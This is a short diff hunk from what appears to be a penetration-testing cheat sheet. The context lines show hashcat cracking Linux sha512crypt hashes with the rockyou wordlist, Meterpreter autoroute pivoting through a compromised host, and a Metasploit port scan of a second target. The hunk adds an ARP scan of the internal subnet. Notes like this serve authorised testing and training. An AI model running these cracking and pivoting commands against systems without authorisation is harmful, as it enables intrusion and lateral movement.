@@ -2680,6 +2680,8 @@ hashcat -a 3 -m 1800 linux.hashes.txt /usr/share/wordlists/rockyou.txt
 # Meterpreter on Target1
 run autoroute -s <TARGET1_SUBNET_NETWORK>
 run autoroute -p
+run arp_scanner -r <TARGET1_SUBNET_NETWORK>
+
 background
 use auxiliary/scanner/portscan/tcp
 set RHOSTS <TARGET2_IP>
